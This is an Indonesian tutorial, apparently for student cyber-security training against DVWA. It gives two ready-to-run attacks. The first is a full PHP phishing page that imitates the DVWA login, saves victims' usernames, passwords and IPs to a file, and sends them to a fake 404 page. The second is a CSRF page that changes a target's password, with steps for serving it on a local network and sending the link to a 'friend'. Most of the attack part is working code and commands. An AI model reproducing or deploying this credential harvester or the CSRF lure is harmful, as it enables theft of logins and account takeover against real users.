# CSRF (Cross-Site Request Forgery) adalah serangan siber yang menipu pengguna yang sudah login untuk melakukan tindakan tidak diinginkan pada aplikasi web tanpa persetujuan mereka. Serangan ini mengeksploitasi kepercayaan situs web terhadap browser pengguna, memalsukan permintaan seperti mengubah password, email, atau transfer dana.
## cara 1
## buat website phishing
### File yang dibutuhkan (simpan dalam 1 folder)
### 1. login.php (tampilan halaman DVWA palsu + backend penyimpan)
```bash
<?php
// Jika ada POST, simpan kredensial ke file
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    if (!empty($username) && !empty($password)) {
        $ip = $_SERVER['REMOTE_ADDR'];
        $time = date('Y-m-d H:i:s');
        $logEntry = "[$time] IP: $ip | User: $username | Pass: $password" . PHP_EOL;
        
        // Simpan ke file credentials.txt
        file_put_contents('credentials.txt', $logEntry, FILE_APPEND | LOCK_EX);
        
        // Redirect ke halaman 404 palsu agar target mengira gagal
        header('Location: 404.html');
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Damn Vulnerable Web Application - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0e1a;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            background: #1e1f2c;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            width: 100%;
            max-width: 450px;
            padding: 30px;
            border: 1px solid #2e3a4e;
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo h1 {
            color: #ff9800;
            font-size: 28px;
            letter-spacing: 2px;
            font-weight: 600;
        }

        .logo p {
            color: #7f8c8d;
            font-size: 14px;
            margin-top: 5px;
        }

        .warning {
            background: #2c2e3e;
            border-left: 4px solid #ff9800;
            padding: 12px;
            font-size: 13px;
            color: #ddd;
            margin-bottom: 25px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            display: block;
            color: #ccc;
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 14px;
        }

        .input-group input {
            width: 100%;
            padding: 12px 15px;
            background: #2a2b38;
            border: 1px solid #3a3c4e;
            border-radius: 8px;
            color: white;
            font-size: 15px;
            outline: none;
            transition: 0.2s;
        }

        .input-group input:focus {
            border-color: #ff9800;
            box-shadow: 0 0 5px rgba(255, 152, 0, 0.3);
        }

        button {
            width: 100%;
            background: #ff9800;
            border: none;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            color: #1e1f2c;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
        }

        button:hover {
            background: #e68900;
            transform: scale(1.01);
        }

        .logout-msg {
            background: #2c3e2f;
            color: #8bc34a;
            padding: 10px;
            border-radius: 6px;
            font-size: 13px;
            text-align: center;
            margin-bottom: 20px;
            border: 1px solid #5a8f4c;
        }

        .footer {
            text-align: center;
            margin-top: 25px;
            font-size: 12px;
            color: #5a6270;
        }

        .footer a {
            color: #ff9800;
            text-decoration: none;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">
        <h1>DVWA</h1>
        <p>Damn Vulnerable Web Application</p>
    </div>

    <div class="logout-msg">
        🔐 You have logged out. Please login again.
    </div>

    <form method="POST" action="">
        <div class="input-group">
            <label>Username</label>
            <input type="text" name="username" placeholder="Enter username" required autocomplete="off">
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" name="password" placeholder="Enter password" required>
        </div>
        <button type="submit">Login</button>
    </form>

    <div class="footer">
        <span>⚠️ Security training purpose only</span><br>
        <a href="#">Forgot password?</a>
    </div>
</div>
</body>
</html>
```
### 2. 404.html (halaman error palsu setelah login)
```bash 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body {
            background: #0a0e1a;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #ff9800;
        }
        .container {
            text-align: center;
        }
        h1 {
            font-size: 72px;
            margin-bottom: 10px;
        }
        p {
            font-size: 18px;
            color: #aaa;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <p style="font-size: 14px; margin-top: 20px;">⚠️ This is a simulated environment</p>
</div>
</body>
</html>
```
### Cara menjalankan di IP Lokal
Opsi 1: Pakai PHP bawaan (termudah)
bash
### Buka terminal di folder tempat file disimpan
```bash
php -S 0.0.0.0:8080
```
Kemudian teman Anda akses:
```bash
http://192.168.68.169:8080/login.php
```

### Opsi 2: Pakai XAMPP / Laragon
### 1.Copy folder ke htdocs (XAMPP) atau www (Laragon)
### 2.Akses:
```bash
http://localhost/phishing/login.php
```
### 3.Untuk IP lokal, pastikan firewall mengizinkan port 80/8080
### 4.akses:
```bash
http://192.168.68.169/phishing/login.php
```
## cara 2: mengambil akun dvwa teman
## jika memakai kali-linux virtualbox maka network adapter harus diaktifkan lalu diubah ke bridged adapter
## buka terminal, ketikkan dibawah ini untuk masuk ke directory 
```bash
cd /var/www/html
```
lalu buat file untuk penyerang csrf nya, ketik
```bash
sudo nano csrf_attack.html
```
## di dalam file csrf_attack.html, isi dengan html dibawah ini.
```bash
<!DOCTYPE html>
<html>
<head>
    <title>LKS Cyber Training - CSRF Attack</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        button {
            background: #ff6b6b;
            color: white;
            padding: 15px 30px;
            font-size: 20px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background: #ff4757;
        }
    </style>
</head>
<body>
    <h1>🎯 LKS Cyber Security Training</h1>
    <h2>CSRF Attack Demonstration</h2>
    <p>Click the button below to execute CSRF attack:</p>
    <a href="http://192.168.68.106/dvwa/vulnerabilities/csrf/?password_new=lks123&password_conf=lks123&Change=Change#">
        <button>🔥 Execute CSRF Attack 🔥</button>
    </a>
    <p><small>Target: 192.168.68.106 | New Password: lks123</small></p>
</body>
</html>
```
## note: dibagian (?password_new=lks123&password_conf=lks123&Change=Change#) di bagian ?password_new=(isi dengan password yang kita mau) dan dibagian ini juga (&password_conf=(disini jugaa)&Change=Change#)
## kalau sudah siap, untuk mengecek file nya sudah dibuat apa belum, ketik
```bash
ls -la
```
## untuk merestart service apache2, ketik
```bash
sudo systemctl restart apache2
```
## untuk mengirim website csrf_attack.html, cek dulu ipnya dengan ketik
```bash
ip a
```
## jika sudah dapat ip nya, berikan linknya ke target. contoh link
```bash
http://192.168.68.110/csrf_attack.html
```
